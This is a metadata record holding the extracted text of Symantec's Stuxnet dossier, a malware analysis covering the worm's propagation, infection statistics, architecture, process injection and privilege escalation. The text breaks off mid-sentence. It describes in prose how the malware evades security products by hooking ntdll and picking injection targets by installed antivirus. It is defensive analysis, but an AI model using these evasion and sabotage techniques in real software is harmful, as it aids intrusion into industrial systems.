{
    "id": "9a05e231-5249-457d-ad35-3aa4c8db72e4",
    "created_at": "2022-10-25T16:48:24.116197Z",
    "updated_at": "2025-03-27T02:16:59.253252Z",
    "deleted_at": null,
    "sha1_hash": "93c9ad9c9d9e1d882d56d8ceb1aa684d147d0a78",
    "title": "W32.Stuxnet Dossier",
    "authors": "Symantec",
    "file_creation_date": "2011-07-11T16:16:57Z",
    "file_modification_date": "2011-07-11T16:17:56Z",
    "file_size": 4332399,
    "plain_text": "l it Wi d tkit th fi t PLC tkit ti i i\n\n\n## Security Response\n\n# W32.Stuxnet Dossier\n\nVersion 1.4 (February 2011)\n\n##### Nicolas Falliere, Liam O Murchu, and Eric Chien\n\n_While the bulk of the analysis is complete, Stuxnet is an incredibly large_\n\n##### Contents and complex threat. The authors expect to make revisions to this document\n\n_shortly after release as new information is uncovered or may be publicly_\n\nIntroduction........................................................ 1\n\n_disclosed. This paper is the work of numerous individuals on the Syman­_\n\nExecutive Summary............................................ 2\n\n_tec Security Response team over the last three months well beyond the_\n\nAttack Scenario................................................... 3\n\n_cited authors. Without their assistance, this paper would not be possible._\n\nTimeline............................................................... 4\nInfection Statistics.............................................. 5\nStuxnet Architecture........................................ 12\n\n### Introduction\n\nInstallation........................................................ 16\n\nW32.Stuxnet has gained a lot of attention from researchers and me­\n\nLoad Point......................................................... 20\n\ndia recently. There is good reason for this. Stuxnet is one of the\n\nCommand and Control...................................... 21\n\nmost complex threats we have analyzed. In this paper we take a de­\n\nWindows Rootkit Functionality........................ 24\n\ntailed look at Stuxnet and its various components and particularly\n\nStuxnet Propagation Methods......................... 25\n\nfocus on the final goal of Stuxnet, which is to reprogram industrial\n\nModifying PLCs................................................. 36\n\ncontrol systems. Stuxnet is a large, complex piece of malware with\n\nPayload Exports................................................ 50\n\nmany different components and functionalities. We have already\n\nPayload Resources............................................ 51\n\ncovered some of these components in our [blog series on the top­](http://www.symantec.com/connect/blog-tags/w32stuxnet)\n\nVariants............................................................. 53\n\nic. While some of the information from those blogs is included here,\n\nSummary........................................................... 55\n\nthis paper is a more comprehensive and in-depth look at the threat.\n\nAppendix A........................................................ 56\nAppendix B ....................................................... 58\n\nStuxnet is a threat that was primarily written to target an industrial\n\nAppendix C........................................................ 59\n\ncontrol system or set of similar systems. Industrial control systems are\n\nRevision History................................................ 68\n\nused in gas pipelines and power plants. Its final goal is to reprogram\nindustrial control systems (ICS) by modifying code on programmable\nlogic controllers (PLCs) to make them work in a manner the attacker in­\ntended and to hide those changes from the operator of the equipment.\nIn order to achieve this goal the creators amassed a vast array of com­\nponents to increase their chances of success. This includes zero-day\n\n\n-----\n\ntechniques, complex process injection and hooking code, network infection routines, peer-to-peer updates, and\na command and control interface. We take a look at each of the different components of Stuxnet to understand\nhow the threat works in detail while keeping in mind that the ultimate goal of the threat is the most interesting\nand relevant part of the threat.\n\n### Executive Summary\n\nStuxnet is a threat targeting a specific industrial control system likely in Iran, such as a gas pipeline or power\nplant. The ultimate goal of Stuxnet is to sabotage that facility by reprogramming programmable logic controllers\n(PLCs) to operate as the attackers intend them to, most likely out of their specified boundaries.\n\nStuxnet was discovered in July, but is confirmed to have existed at least one year prior and likely even before.\nThe majority of infections were found in Iran. Stuxnet contains many features such as:\n\n     - Self-replicates through removable drives exploiting a vulnerability allowing auto-execution.\n\n[Microsoft Windows Shortcut ‘LNK/PIF’ Files Automatic File Execution Vulnerability (BID 41732)](http://www.securityfocus.com/bid/41732)\n\n     - Spreads in a LAN through a vulnerability in the Windows Print Spooler.\n\n[Microsoft Windows Print Spooler Service Remote Code Execution Vulnerability (BID 43073)](http://www.securityfocus.com/bid/43073)\n\n     - [Spreads through SMB by exploiting the Microsoft Windows Server Service RPC Handling Remote Code Execu­](http://www.securityfocus.com/bid/31874)\n[tion Vulnerability (BID 31874).](http://www.securityfocus.com/bid/31874)\n\n     - Copies and executes itself on remote computers through network shares.\n\n     - Copies and executes itself on remote computers running a WinCC database server.\n\n     - Copies itself into Step 7 projects in such a way that it automatically executes when the Step 7 project is\n\nloaded.\n\n     - Updates itself through a peer-to-peer mechanism within a LAN.\n\n     - Exploits a total of four unpatched Microsoft vulnerabilities, two of which are previously mentioned vulner­\n\nabilities for self-replication and the other two are escalation of privilege vulnerabilities that have yet to be\ndisclosed.\n\n     - Contacts a command and control server that allows the hacker to download and execute code, including up­\n\ndated versions.\n\n     - Contains a Windows rootkit that hide its binaries.\n\n     - Attempts to bypass security products.\n\n     - Fingerprints a specific industrial control system and modifies code on the Siemens PLCs to potentially sabo­\n\ntage the system.\n\n     - Hides modified code on PLCs, essentially a rootkit for PLCs.\n\n\n-----\n\n### Attack Scenario\n\nThe following is a possible attack scenario. It is only speculation driven by the technical features of Stuxnet.\n\nIndustrial control systems (ICS) are operated by a specialized assembly like code on programmable logic control­\nlers (PLCs). The PLCs are often programmed from Windows computers not connected to the Internet or even the\ninternal network. In addition, the industrial control systems themselves are also unlikely to be connected to the\nInternet.\n\nFirst, the attackers needed to conduct reconnaissance. As each PLC is configured in a unique manner, the attack­\ners would first need the ICS’s schematics. These design documents may have been stolen by an insider or even\nretrieved by an early version of Stuxnet or other malicious binary. Once attackers had the design documents and\npotential knowledge of the computing environment in the facility, they would develop the latest version of Stux­\nnet. Each feature of Stuxnet was implemented for a specific reason and for the final goal of potentially sabotag­\ning the ICS.\n\nAttackers would need to setup a mirrored environment that would include the necessary ICS hardware, such as\nPLCs, modules, and peripherals in order to test their code. The full cycle may have taken six months and five to\nten core developers not counting numerous other individuals, such as quality assurance and management.\n\nIn addition their malicious binaries contained driver files that needed to be digitally signed to avoid suspicion.\nThe attackers compromised two digital certificates to achieve this task. The attackers would have needed to\nobtain the digital certificates from someone who may have physically entered the premises of the two companies\nand stole them, as the two companies are in close physical proximity.\n\nTo infect their target, Stuxnet would need to be introduced into the target environment. This may have occurred\nby infecting a willing or unknowing third party, such as a contractor who perhaps had access to the facility, or an\ninsider. The original infection may have been introduced by removable drive.\n\nOnce Stuxnet had infected a computer within the organization it began to spread in search of Field PGs, which\nare typical Windows computers but used to program PLCs. Since most of these computers are non-networked,\nStuxnet would first try to spread to other computers on the LAN through a zero-day vulnerability, a two year old\nvulnerability, infecting Step 7 projects, and through removable drives. Propagation through a LAN likely served\nas the first step and propagation through removable drives as a means to cover the last and final hop to a Field\nPG that is never connected to an untrusted network.\n\nWhile attackers could control Stuxnet with a command and control server, as mentioned previously the key com­\nputer was unlikely to have outbound Internet access. Thus, all the functionality required to sabotage a system\nwas embedded directly in the Stuxnet executable. Updates to this executable would be propagated throughout\nthe facility through a peer-to-peer method established by Stuxnet.\n\nWhen Stuxnet finally found a suitable computer, one that ran Step 7, it would then modify the code on the PLC.\nThese modifications likely sabotaged the system, which was likely considered a high value target due to the large\nresources invested in the creation of Stuxnet.\n\nVictims attempting to verify the issue would not see any rogue PLC code as Stuxnet hides its modifications.\n\nWhile their choice of using self-replication methods may have been necessary to ensure they’d find a suitable\nField PG, they also caused noticeable collateral damage by infecting machines outside the target organization.\nThe attackers may have considered the collateral damage a necessity in order to effectively reach the intended\ntarget. Also, the attackers likely completed their initial attack by the time they were discovered.\n\n\n-----\n\n### Timeline\n\n|eline|Col2|\n|---|---|\n|Table 1||\n|W32.Stuxnet Timeline||\n|Date|Event|\n|November 20, 2008|Trojan.Zlob variant found to be using the LNK vulnerability only later identified in Stuxnet.|\n|April, 2009|Security magazine Hakin9 releases details of a remote code execution vulnerability in the Printer Spooler service. Later identified as MS10-061.|\n|June, 2009|Earliest Stuxnet sample seen. Does not exploit MS10-046. Does not have signed driver files.|\n|January 25, 2010|Stuxnet driver signed with a valid certificate belonging to Realtek Semiconductor Corps.|\n|March, 2010|First Stuxnet variant to exploit MS10-046.|\n|June 17, 2010|Virusblokada reports W32.Stuxnet (named RootkitTmphider). Reports that it’s using a vulnerability in the processing of shortcuts/.lnk files in order to propagate (later identified as MS10-046).|\n|July 13, 2010|Symantec adds detection as W32.Temphid (previously detected as Trojan Horse).|\n|July 16, 2010|Microsoft issues Security Advisory for “Vulnerability in Windows Shell Could Allow Remote Code Execution (2286198)” that covers the vulnerability in processing shortcuts/.lnk files. Verisign revokes Realtek Semiconductor Corps certificate.|\n|July 17, 2010|Eset identifies a new Stuxnet driver, this time signed with a certificate from JMicron Technology Corp.|\n|July 19, 2010|Siemens report that they are investigating reports of malware infecting Siemens WinCC SCADA systems. Symantec renames detection to W32.Stuxnet.|\n|July 20, 2010|Symantec monitors the Stuxnet Command and Control traffic.|\n|July 22, 2010|Verisign revokes the JMicron Technology Corps certificate.|\n|August 2, 2010|Microsoft issues MS10-046, which patches the Windows Shell shortcut vulnerability.|\n|August 6, 2010|Symantec reports how Stuxnet can inject and hide code on a PLC affecting industrial control systems.|\n|September 14, 2010|Microsoft releases MS10-061 to patch the Printer Spooler Vulnerability identified by Symantec in August. Microsoft report two other privilege escalation vulnerabilities identified by Symantec in August.|\n|September 30, 2010|Symantec presents at Virus Bulletin and releases comprehensive analysis of Stuxnet.|\n\n\n-----\n\n### Infection Statistics\n\nOn July 20, 2010 Symantec set up a system to monitor traffic to the Stuxnet command and control (C&C) serv­\ners. This allowed us to observe rates of infection and identify the locations of infected computers, ultimately\nworking with CERT and other organizations to help inform infected parties. The system only identified command\nand control traffic from computers that were able to connect to the C&C servers. The data sent back to the C&C\nservers is encrypted and includes data such as the internal and external IP address, computer name, OS version,\nand if it’s running the Siemens SIMATIC Step 7 industrial control software.\n\nAs of September 29, 2010, the data has shown that there are approximately 100,000 infected hosts. The follow­\ning graph shows the number of unique infected hosts by country:\n\nFigure 1\n###### Infected Hosts\n\nThe following graph shows the number of infected organizations by country based on WAN IP addresses:\n\nFigure 2\n###### Infected Organizations (By WAN IP)\n\n\n-----\n\nWe have observed over 40,000 unique external IP addresses, from over 155 countries. Looking at the percentage\nof infected hosts by country, shows that approximately 60% of infected hosts are in Iran:\n\nFigure 3\n###### Geographic Distribution of Infections\n\nStuxnet aims to identify those hosts which have the Siemens Step 7 software installed. The following chart\nshows the percentage of infected hosts by country with the Siemens software installed.\n\nFigure 4\n###### Percentage of Stuxnet infected Hosts with Siemens Software installed\n\nLooking at newly infected IP addresses per day, on August 22 we observed that Iran was no longer reporting new\ninfections. This was most likely due to Iran blocking outward connections to the command and control servers,\nrather than a drop-off in infections.\n\n\n-----\n\nFigure 5\n###### Rate of Stuxnet infection of new IPs by Country\n\nThe concentration of infections in Iran likely indicates that this was the initial target for infections and was\nwhere infections were initially seeded. While Stuxnet is a targeted threat, the use of a variety of propagation\ntechniques (which will be discussed later) has meant that Stuxnet has spread beyond the initial target. These\nadditional infections are likely to be “collateral damage”—unintentional side-effects of the promiscuous initial\npropagation methodology utilized by Stuxent. While infection rates will likely drop as users patch their comput­\ners against the vulnerabilities used for propagation, worms of this nature typically continue to be able to propa­\ngate via unsecured and unpatched computers.\n\nBy February 2011, we had gathered 3,280 unique samples representing three different variants. As described in\nthe Configuration Data Block section, Stuxnet records a timestamp, along with other system information, within\nitself each time a new infection occurs. Thus, each sample has a history of every computer that was infected,\nincluding the first infection. Using this data, we are able to determine:\n\n- Stuxnet was a targeted attack on five different organizations, based on the recorded computer domain name.\n\n- 12,000 infections can be traced back to these 5 organizations\n\n- Three organizations were targeted once, one was targeted twice, and another was targeted three times.\n\n  - Domain A was targeted twice (Jun 2009 and Apr 2010).\n\n   - The same computer appears to have been infected each time.\n\n  - Domain B was targeted three times (Jun 2009, Mar 2010, and May 2010).\n\n  - Domain C was targeted once (Jul 2009).\n\n  - Domain D was targeted once (Jul 2009).\n\n  - Domain E appears to have been targeted once (May 2010), but had three initial infections. (I.e., the same\n\ninitially infected USB key was inserted into three different computers.)\n\n  - 12,000 infections originated from these initial 10 infections.\n\n- 1,800 different domain names were recorded.\n\n- Organizations were targeted in June 2009, July 2009, March 2010, April 2010, and May 2010.\n\n- All targeted organizations have a presence in Iran.\n\n- The shortest span between compile time and initial infection was 12 hours.\n\n- The longest span between compile time and initial infection was 28 days.\n\n- The average span between compile time and initial infection was 19 days.\n\n- The median span between compile time and initial infection was 26 days.\n\nNote any timing information could be incorrect due to time zones or incorrectly set system times.\n\n\n-----\n\nThe following table provides details on the initial targets.\n\nTable 2\n##### Attack Waves Against the Initial Targets\n###### Attack Wave Site Compile Time Infection Time Time to Infect\n\nAttack Wave 1 Domain A June, 22 2009 16:31:47 June 23, 2009 4:40:16 0 days 12 hours\n\nDomain B June, 22 2009 16:31:47 June 28, 2009 23:18:14 6 days 6 hours\n\nDomain C June, 22 2009 16:31:47 July 7, 2009 5:09:28 14 days 12 hours\n\nDomain D June, 22 2009 16:31:47 July 19, 2009 9:27:09 26 days 16 hours\n\nAttack Wave 2 Domain B March, 1 2010 5:52:35 March 23, 2010 6:06:07 22 days 0 hours\n\nAttack Wave 3 Domain A April, 14 2010 10:56:22 April 26, 2010 9:37:36 11 days 22 hours\n\nDomain E April, 14 2010 10:56:22 May 11, 2010 6:36:32 26 days 19 hours\n\nDomain E April, 14 2010 10:56:22 May 11, 2010 11:45:53 27 days 0 hours\n\nDomain E April, 14 2010  10:56:22 May 11, 2010 11:46:10 27 days 0 hours\n\nDomain B April, 14 2010 10:56:22 May 13, 2010 5:02:23 28 days 18 hours\n\nThis graph shows the time required after compilation to the first infection.\n\nFigure 6\n###### Days Before Infection\n\nThe following is a graph that shows the clusters of infections resulting from the 10 different initial infections.\nEach infection is a black circle. The red circles represent the variant used. The other colored circles represent the\ninitial infection with each initial domain having its own color (green, yellow, blue, purple, and orange).\n\n|Table 2|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|Attack Waves Against the Initial Targets|||||\n|Attack Wave|Site|Compile Time|Infection Time|Time to Infect|\n|Attack Wave 1|Domain A|June, 22 2009 16:31:47|June 23, 2009 4:40:16|0 days 12 hours|\n||Domain B|June, 22 2009 16:31:47|June 28, 2009 23:18:14|6 days 6 hours|\n||Domain C|June, 22 2009 16:31:47|July 7, 2009 5:09:28|14 days 12 hours|\n||Domain D|June, 22 2009 16:31:47|July 19, 2009 9:27:09|26 days 16 hours|\n|Attack Wave 2|Domain B|March, 1 2010 5:52:35|March 23, 2010 6:06:07|22 days 0 hours|\n|Attack Wave 3|Domain A|April, 14 2010 10:56:22|April 26, 2010 9:37:36|11 days 22 hours|\n||Domain E|April, 14 2010 10:56:22|May 11, 2010 6:36:32|26 days 19 hours|\n||Domain E|April, 14 2010 10:56:22|May 11, 2010 11:45:53|27 days 0 hours|\n||Domain E|April, 14 2010 10:56:22|May 11, 2010 11:46:10|27 days 0 hours|\n||Domain B|April, 14 2010 10:56:22|May 13, 2010 5:02:23|28 days 18 hours|\n\n\n-----\n\nFigure 7\n###### Clusters of Infections Based on Initial Infections\n\n\n-----\n\nThere are a total of 10 clusters representing 10 initial infections. The attack on Domain B in March 2010 spread\nthe most successfully. Early attacks in June 2009 show the fewest infections; however, these numbers are\nskewed because of the low number of June 2009 samples that were recovered.\n\nThe following picture shows a zoomed-in view of the lower right of the image. This cluster is the attack on Do­\nmain E with the initial infection time of 2010/05/11 11:46:10 with the April 2010 variant.\n\nFigure 8\n###### Domain E Attack (detail)\n\nYou can see that the graph primarily has linear branches such that a single infection does not infect many com­\nputers, but only a single computer. While this is partially due to rate-limiting code within Stuxnet—for example,\na USB infection will delete itself from the USB key after the third infection—a larger influencer may be the\nlimited number of samples that were recovered. Additional samples would likely yield many more sub-branches.\nStuxnet’s propagation mechanisms are Figure 9\nall LAN based and thus, the final target Variant Infection Distribution\nmust be assumed in close network\nproximity to the initial seeded targets.\nNevertheless, with 1,800 different\ncomputer domains out of 12,000\ninfections, Stuxnet clearly escaped the\noriginal organizations due to collabo­\nration with partner organizations.\n\nOf the approximately 12,000 infec­\ntions, the chart in figure 9 shows\nwhich variants resulted in the most\ninfections.\n\n\n-----\n\nThe March 2010 variant accounts for 69% of all infections. Thus, the March 2010 variant may have been seeded\nmore successfully. Note the single targeted organization in March 2010 was also targeted in June 2009 and in\nApril 2010 and neither of those other seeded attempts resulted in as many infections as in March. While smaller\ninfection rates for the June 2009 variant would be expected since it had less replication methods, the April 2010\nvariant is almost identical to the March 2010 variant. Thus, either the different seed within the same organiza­\ntion resulted in significantly different rates of spread (e.g., seeding in a computer in a department with less\ncomputer-security restrictions) or the data is skewed due to the small percentage of samples recovered.\n\n\n-----\n\n### Stuxnet Architecture\n\n#### Organization\n\nStuxnet has a complex architecture that is worth outlining before continuing with our analysis.\n\nThe heart of Stuxnet consists of a large .dll file that contains many different exports and resources. In addition to\nthe large .dll file, Stuxnet also contains two encrypted configuration blocks.\n\nThe dropper component of Stuxnet is a wrapper program that contains all of the above components stored inside\nitself in a section name “stub”. This stub section is integral to the working of Stuxnet. When the threat is execut­\ned, the wrapper extracts the .dll file from the stub section, maps it into memory as a module, and calls one of the\nexports.\n\nA pointer to the original stub section is passed to this export as a parameter. This export in turn will extract the\n.dll file from the stub section, which was passed as a parameter, map it into memory and call another different\nexport from inside the mapped .dll file. The pointer to the original stub section is again passed as a parameter.\nThis occurs continuously throughout the execution of the threat, so the original stub section is continuously\npassed around between different processes and functions as a parameter to the main payload. In this way every\nlayer of the threat always has access to the main .dll and the configuration blocks.\n\nIn addition to loading the .dll file into memory and calling an export directly, Stuxnet also uses another technique\nto call exports from the main .dll file. This technique is to read an executable template from its own resources,\npopulate the template with\nappropriate data, such as Table 3\nwhich .dll file to load and DLL Exports\nwhich export to call, and then\n\n###### Export # Function\n\nto inject this newly populated\n\n1 Infect connected removable drives, starts RPC server\n\nexecutable into another pro­\ncess and execute it. The newly 2 Hooks APIs for Step 7 project file infections\npopulated executable tem­ 4 Calls the removal routine (export 18)\nplate will load the original .dll 5 Verifies if the threat is installed correctly\nfile and call whatever export\n\n6 Verifies version information\n\nthe template was populated\nwith. 7 Calls Export 6\n\n9 Updates itself from infected Step 7 projects\n\nAlthough the threat uses\n\n10 Updates itself from infected Step 7 projects\n\nthese two different tech­\n\n14 Step 7 project file infection routine\n\nniques to call exports in the\nmain .dll file, it should be 15 Initial entry point\nclear that all the functionality 16 Main installation\nof the threat can be ascer­ 17 Replaces Step 7 DLL\ntained by analyzing all of the\n\n18 Uninstalls Stuxnet\n\nexports from the main .dll file.\n\n19 Infects removable drives\n\n#### Exports 22 Network propagation routines\n\n24 Check Internet connection\n\nAs mentioned above, the\nmain .dll file contains all of 27 RPC Server\nthe code to control the worm. 28 Command and control routine\nEach export from this .dll 29 Command and control routine\nfile has a different purpose\n\n31 Updates itself from infected Step 7 projects\n\nin controlling the threat as\n\n32 Same as 1\n\noutlined in table 3.\n\n|Table 3|Col2|\n|---|---|\n|DLL Exports||\n|Export #|Function|\n|1|Infect connected removable drives, starts RPC server|\n|2|Hooks APIs for Step 7 project file infections|\n|4|Calls the removal routine (export 18)|\n|5|Verifies if the threat is installed correctly|\n|6|Verifies version information|\n|7|Calls Export 6|\n|9|Updates itself from infected Step 7 projects|\n|10|Updates itself from infected Step 7 projects|\n|14|Step 7 project file infection routine|\n|15|Initial entry point|\n|16|Main installation|\n|17|Replaces Step 7 DLL|\n|18|Uninstalls Stuxnet|\n|19|Infects removable drives|\n|22|Network propagation routines|\n|24|Check Internet connection|\n|27|RPC Server|\n|28|Command and control routine|\n|29|Command and control routine|\n|31|Updates itself from infected Step 7 projects|\n|32|Same as 1|\n\n\n-----\n\n#### Resources\n\nThe main .dll file also contains many different resources that the exports above use in the course of controlling\nthe worm. The resources vary from full .dll files to template executables to configuration files and exploit mod­\nules.\n\nBoth the exports and resources are discussed in the sections below.\n\nTable 4\n##### DLL Resources\n###### Resource ID Function\n\n201 MrxNet.sys load driver, signed by Realtek\n\n202 DLL for Step 7 infections\n\n203 CAB file for WinCC infections\n\n205 Data file for Resource 201\n\n207 Autorun version of Stuxnet\n\n208 Step 7 replacement DLL\n\n209 Data file (%windows%\\help\\winmic.fts)\n\n210 Template PE file used for injection\n\n221 Exploits MS08-067 to spread via SMB.\n\n222 Exploits MS10-061 Print Spooler Vulnerability\n\n231 Internet connection check\n\n240 LNK template file used to build LNK exploit\n\n241 USB Loader DLL ~WTR4141.tmp\n\n242 MRxnet.sys rootkit driver\n\n250 Exploits Windows Win32k.sys Local Privilege Escalation (MS10-073)\n\n#### Bypassing Behavior Blocking When Loading DLLs\n\nWhenever Stuxnet needs to load a DLL, including itself, it uses a special method designed to bypass behaviorblocking and host intrusion-protection based technologies that monitor LoadLibrary calls. Stuxnet calls Load­\nLibrary with a specially crafted file name that does not exist on disk and normally causes LoadLibrary to fail.\nHowever, W32.Stuxnet has hooked Ntdll.dll to monitor for requests to load specially crafted file names. These\nspecially crafted filenames are mapped to another location instead—a location specified by W32.Stuxnet. That\nlocation is generally an area in memory where a .dll file has been decrypted and stored by the threat previously.\nThe filenames used have the pattern of KERNEL32.DLL.ASLR.[HEXADECIMAL] or SHELL32.DLL.ASLR. [HEXA­\nDECIMAL], where the variable [HEXADECIMAL]is a hexadecimal value.\n\nThe functions hooked for this purpose in Ntdll.dll are:\n\n   - ZwMapViewOfSection\n\n   - ZwCreateSection\n\n   - ZwOpenFile\n\n   - ZwCloseFile\n\n   - ZwQueryAttributesFile\n\n   - ZwQuerySection\n\nOnce a .dll file has been loaded via the method shown above, GetProcAddress is used to find the address of a\nspecific export from the .dll file and that export is called, handing control to that new .dll file.\n\n|Both the exports and resources are discussed in the sections below.|Col2|\n|---|---|\n|Table 4||\n|DLL Resources||\n|Resource ID|Function|\n|201|MrxNet.sys load driver, signed by Realtek|\n|202|DLL for Step 7 infections|\n|203|CAB file for WinCC infections|\n|205|Data file for Resource 201|\n|207|Autorun version of Stuxnet|\n|208|Step 7 replacement DLL|\n|209|Data file (%windows%\\help\\winmic.fts)|\n|210|Template PE file used for injection|\n|221|Exploits MS08-067 to spread via SMB.|\n|222|Exploits MS10-061 Print Spooler Vulnerability|\n|231|Internet connection check|\n|240|LNK template file used to build LNK exploit|\n|241|USB Loader DLL ~WTR4141.tmp|\n|242|MRxnet.sys rootkit driver|\n|250|Exploits Windows Win32k.sys Local Privilege Escalation (MS10-073)|\n\n\n-----\n\n#### Injection Technique\n\nWhenever an export is called, Stuxnet typically injects the entire DLL into another process and then just calls the\nparticular export. Stuxnet can inject into an existing or newly created arbitrary process or a preselected trusted\nprocess. When injecting into a trusted process, Stuxnet may keep the injected code in the trusted process or\ninstruct the trusted process to inject the code into another currently running process.\n\nThe trusted process consists of a set of default Windows processes and a variety of security products. The cur­\nrently running processes are enumerated for the following:\n\n   - Kaspersky KAV (avp.exe)\n\n   - Mcafee (Mcshield.exe)\n\n   - AntiVir (avguard.exe)\n\n   - BitDefender (bdagent.exe)\n\n   - Etrust (UmxCfg.exe)\n\n   - F-Secure (fsdfwd.exe)\n\n   - Symantec (rtvscan.exe)\n\n   - Symantec Common Client (ccSvcHst.exe)\n\n   - Eset NOD32 (ekrn.exe)\n\n   - Trend Pc-Cillin (tmpproxy.exe)\n\nIn addition, the registry is searched for indicators that the following programs are installed:\n\n   - KAV v6 to v9\n\n   - McAfee\n\n   - Trend PcCillin\n\nIf one of the above security product processes are detected, version information of the main image is extracted.\nBased on the version number, the target process of injection will be determined or the injection process will fail\nif the threat considers the security product non-bypassable.\n\nThe potential target processes for the injection are as follows:\n\n   - Lsass.exe\n\n   - Winlogon.exe\n\n   - Svchost.exe\n\n   - The installed security product process\n\nTable 5 describes which process is used for injection depending on which security products are installed. In ad­\ndition, Stuxnet will determine if it needs to use one of the two currently undisclosed privilege escalation vulner­\nabilities before injecting. Then, Stuxnet executes the target process in suspended mode.\n\nA template PE file is extracted from itself and a new Table 5\nsection called .verif is created. The section is made Process Injection\nlarge enough so that the entry point address of\n\n###### Security Product Installed Injection target\n\nthe target process falls within the .verif section. At\nthat address in the template PE file, Stuxnet places KAV v1 to v7 LSASS.EXE\na jump to the actual desired entry point of the KAV v8 to v9 KAV Process\ninjected code. These bytes are then written to the\n\nMcAfee Winlogon.exe\n\ntarget process and ResumeThread is called allowing\n\nAntiVir Lsass.exe\n\nthe process to execute and call the injected code.\n\nBitDefender Lsass.exe\n\nThis technique may bypass security products that ETrust v5 to v6 Fails to Inject\nemploy behavior-blocking.\n\n\nIn addition to creating the new section and patch­\ning the entry point, the .stub section of the wrapper\n.dll file (that contains the main .dll file and configu­\nration data) is mapped to the memory of the new\nprocess by means of shared sections So the new\n\n|epending on which security products are installed. In ad­ the two currently undisclosed privilege escalation vulner­ arget process in suspended mode.|Col2|\n|---|---|\n|Table 5||\n|Process Injection||\n|Security Product Installed|Injection target|\n|KAV v1 to v7|LSASS.EXE|\n|KAV v8 to v9|KAV Process|\n|McAfee|Winlogon.exe|\n|AntiVir|Lsass.exe|\n|BitDefender|Lsass.exe|\n|ETrust v5 to v6|Fails to Inject|\n|ETrust (Other)|Lsass.exe|\n|F-Secure|Lsass.exe|\n|Symantec|Lsass.exe|\n|ESET NOD32|Lsass.exe|\n\n\nTrend PC Cillin Trend Process\n\n\n-----\n\nprocess has access to the original .stub section. When the newly injected process is resumed, the injected code\nunpacks the .dll file from the mapped .stub section and calls the desired export.\n\nInstead of executing the export directly, the injected code can also be instructed to inject into another arbitrary\nprocess instead and within that secondary process execute the desired export.\n\n#### Configuration Data Block\n\nThe configuration data block contains all the values used to control how Stuxnet will act on a compromised com­\nputer. Example fields in the configuration data can be seen in the Appendix.\n\nWhen a new version of Stuxnet is created (using the main DLL plus the 90h-byte data block plus the configura­\ntion data), the configuration data is updated, and also a computer description block is appended to the block\n(encoded with a NOT XOR 0xFF). The computer description block contains information such as computer name,\ndomain name, OS version, and infected S7P paths. Thus, the configuration data block can grow pretty big, larger\nthan the initial 744 bytes.\n\nThe following is an example of the computer description block :\n```\n  5.1 - 1/1/0 - 2 - 2010/09/22-15:15:47 127.0.0.1, [COMPUTER NAME] [DOMAIN NAME] [c:\\a\\1.\n  zip:\\proj.s7p]\n\n```\nThe following describes each field:\n\n5.1 - Major OS Version and Minor OS Version\n1/1/0 – Flags used by Stuxnet\n2 – Flag specifying if the computer is part of a workgroup or domain\n2010/09/22-15:15:47 – The time of infection.\n127.0.0.1 – Up to IP addresses of the compromised computer (not in the June 2009 version).\n\n[COMPUTER NAME] – The computer name.\n\n[DOMAIN NAME] – The domain or workgroup name.\n\n[c:\\a\\1.zip:\\proj.s7p] – The file name of infected project file.\n\n\n-----\n\n### Installation\n\nExport 15 is the first export called when the .dll file is loaded for the first time. It is responsible for checking that\nthe threat is running on a compatible version of Windows, checking whether the computer is already infected or\nnot, elevating the privilege of the current process to system, checking what antivirus products are installed, and\nwhat the best process to inject into is. It then injects the .dll file into the chosen process using a unique injection\ntechnique described in the Injection Technique section and calls export 16.\n\nFigure 10\n###### Control flow for export 15\n\nThe first task in export 15 is to check if the configuration data is up-to-date. The configuration data can be\nstored in two locations. Stuxnet checks which is most up-to-date and proceeds with that configuration data.\nNext, Stuxnet determines if it is running on a 64-bit machine or not; if the machine is 64-bit the threat exits.\nAt this point it also checks to see what operating system it is running on. Stuxnet will only run on the following\noperating systems:\n\n     - Win2K\n\n     - WinXP\n\n     - Windows 2003\n\n     - Vista\n\n     - Windows Server 2008\n\n     - Windows 7\n\n     - Windows Server 2008 R2\n\nIf it is not running on one of these operating systems it will exit.\n\nNext, Stuxnet checks if it has Administrator rights on the computer. Stuxnet wants to run with the highest privi­\nlege possible so that it will have permission to take whatever actions it likes on the computer. If it does not have\nAdministrator rights, it will execute one of the two zero-day escalation of privilege attacks described below.\n\n\n-----\n\nIf the process already has the rights it requires it proceeds to prepare to call export 16 in the main .dll file. It calls\nexport 16 by using the injection techniques described in the Injection Technique section.\n\nWhen the process does not have Adminstrator rights on the system it will try to attain these privileges by using\none of two zero-day escalation of privilege attacks. The attack vector used is based on the operating system\nof the compromised computer. If the operating system is Windows Vista, Windows 7, or Windows Server 2008\nR2 the currently undisclosed Task Scheduler Escalation of Privilege vulnerability is exploited. If the operating\n[system is Windows XP or Windows 2000 the Windows Win32k.sys Local Privilege Escalation vulnerability (MS10-](http://www.microsoft.com/technet/security/bulletin/ms10-073.mspx)\n[073) is exploited.](http://www.microsoft.com/technet/security/bulletin/ms10-073.mspx)\n\nIf exploited, both of these vulnerabilities result in the main .dll file running as a new process, either within the\ncsrss.exe process in the case of the win32k.sys vulnerability or as a new task with Adminstrator rights in the\ncase of the Task Scheduler vulnerability.\n\nThe code to exploit the win32k.sys vulnerability is stored in resource 250. Details of the Task Scheduler vulner­\nability currently are not released as patches are not yet available. The Win32k.sys vulnerability is described in\nthe Windows Win32k.sys Local Privilege Escalation vulnerability (MS10-073) section.\n\nAfter export 15 completes the required checks, export 16 is called.\n\nExport 16 is the main installer for Stuxnet. It checks the date and the version number of the compromised com­\nputer; decrypts, creates and installs the rootkit files and registry keys; injects itself into the services.exe process\nto infect removable drives; injects itself into the Step7 process to infect all Step 7 projects; sets up the global\nmutexes that are used to communicate between different components; and connects to the RPC server.\n\nFigure 11\n###### Infection routine flow\n\nExport 16 first checks that the configuration data is valid, after that it checks the value “NTVDM TRACE” in the\nfollowing registry key:\n\n\n-----\n\nIf this value is equal to 19790509 the threat will exit. This is thought to be an infection marker or a “do not\ninfect” marker. If this is set correctly infection will not occur. The value may be a random string and represent\nnothing, but also appears to match the format of date markers used in the threat. As a date, the value may be\nMay 9, 1979. This date could be an arbitrary date, a birth date, or some other significant date. While on May 9,\n[1979 a variety of historical events occured, according to Wikipedia “Habib Elghanian was executed by a firing](http://en.wikipedia.org/wiki/Habib_Elghanian)\nsquad in Tehran sending shock waves through the closely knit Iranian Jewish community. He was the first Jew\nand one of the first civilians to be executed by the new Islamic government. This prompted the mass exodus of\nthe once 100,000 member strong Jewish community of Iran which continues to this day.” Symantec cautions\nreaders on drawing any attribution conclusions. Attackers would have the natural desire to 